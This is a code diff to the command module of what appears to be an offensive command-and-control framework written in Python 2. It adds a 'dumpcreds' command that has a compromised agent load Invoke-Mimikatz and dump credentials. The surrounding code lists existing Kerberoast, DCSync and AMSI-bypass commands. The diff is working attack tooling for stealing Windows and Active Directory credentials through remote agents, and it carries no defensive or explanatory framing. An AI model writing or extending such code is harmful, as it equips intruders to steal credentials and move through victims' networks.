@@ -3,6 +3,7 @@ import base64
 import hashlib,binascii
 from core import config
 from core.Encryption import *
+from core import webserver
 from lib import prettytable
 from core.color import bcolors
 from core.color import *
@@ -25,6 +26,7 @@ class cmd:
      'DA',
      'downloads',
      'kerb',
+     'dumpcreds',
      'dcsync_admins',
      'dcsync_list',
      'dcsync_all',
@@ -59,6 +61,7 @@ class cmd:
      ['kerb', 'do kerberoast attack  and dump  service accounts hashes'],
      ['dcsync_all', 'do dcsync attack and get all users hashes'],
      ['dcsync_admins', 'do dcsync attack agains admin users'],
+     ['dumpcreds', 'load mimikatz and dump credentials'],
      ['dcsync_list', 'do dcsync attack agains custom user list '],
      ['get_groups', 'get all the groups user is member of'],
      ['get_users', 'get all the users member in group'],
@@ -136,6 +139,7 @@ class cmd:
         if config.get_pointer()!='main':
             config.set_pointer('main')
         config.AGENTS.clear()
+        webserver.COUNT=0
 
     def delete(self, args = None):
         if config.get_pointer()!='main':
@@ -316,3 +320,10 @@ class cmd:
             print "you can't use this command in main ! chose an agent"
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
+
+    def dumpcreds(self, args=None):
+        if config.get_pointer()=='main':
+            print "you can't use this command in main ! chose an agent"
+            return
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-Mimikatz -DumpCreds"))
